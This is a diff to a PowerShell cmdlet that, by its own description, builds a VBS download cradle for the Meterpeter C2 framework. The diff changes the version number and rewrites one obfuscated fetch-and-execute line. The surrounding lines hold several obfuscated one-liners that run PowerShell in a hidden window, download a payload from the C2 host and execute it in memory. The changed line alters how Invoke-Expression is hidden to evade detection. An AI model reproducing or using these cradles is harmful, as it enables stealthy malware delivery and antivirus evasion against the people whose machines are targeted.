@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: none
    Optional Dependencies: .NET\Framework\v4.0.30319\vbc.exe
-   PS cmdlet Dev version: v1.2.21
+   PS cmdlet Dev version: v1.2.22
 
 .DESCRIPTION
    Cmdlet to create download_crandle.vbs that allows Meterpeter C2 v2.10.14
@@ -176,7 +176,7 @@ If($Egg -ieq "false")
 $TechnicDefault_Tmp = "po@!#r&%h#ll.#x# cd `$Env:TMP;po@!#r&%h#ll.#x# i@!r -Uri http://`"+Cmd+`"/$PayloadName -OutFil# $PayloadName;po@!#r&%h#ll -Fil# $PayloadName"
 $TechnicFileLessOne = "po@!#r&%h#ll -@!indo@!&%tyl# hidd#n -C `"+InvokeMe+`" (N#@!-Obj#ct N#t.W#bCli#nt).Do@!nload&%tring('http://`"+Cmd+`"/$PayloadName')"
 $TechnicFileLessTwo = "po@!#r&%h#ll -@!indo@!&%tyl# hidd#n `$VPN=N#@!-Obj#ct N#t.W#bCli#nt;`$VPN.proxy=[N#t.W#bR#qu#st]::G#t&%y&%t#mW#bProxy();`$VPN.Proxy.Cr#d#ntial&%=[N#t.Cr#d#ntialCach#]::D#faultCr#d#ntial&%;`"+InvokeMe+`" `$VPN.Do@!nload&%tring('http://`"+Cmd+`"/$PayloadName');"
-$TechnicFileLessTre = "po@!#r&%h#ll -@!indo@!&%tyl# hidd#n [IO.&%tr#amR#ader]::n#@!([N#t.@!#bR#qu#&%t]::Cr#at#('http://`"+Cmd+`"/$PayloadName').G#tR#spon&%#().G#tR#spon&%#&%tr#am()).R#adTo#nd()|&(''.SubString.ToString()[67,72,64]-Join'')"
+$TechnicFileLessTre = "po@!#r&%h#ll -@!indo@!&%tyl# hidd#n [IO.&%tr#amR#ader]::n#@!([N#t.@!#bR#qu#&%t]::Cr#at#('http://`"+Cmd+`"/$PayloadName').G#tR#spon&%#().G#tR#spon&%#&%tr#am()).R#adTo#nd()|pow#rsh#ll &('R#x' -r#plac# 'R','i')"
 $TechnicFileLessXml = "po@!#r&%h#ll -@!indo@!&%tyl# hidd#n `$Proxy=N#@!-Obj#ct -ComObj#ct M&%Xml2.&%#rv#rXmlHttp;`$Proxy.Op#n('GET','http://`"+Cmd+`"/$PayloadName',0);`$Proxy.&%#nd();[&%criptblock]::Cr#at#(`$Proxy.R#spon&%#T#xt).Invok#()"
 
 If($Action -ieq "download")
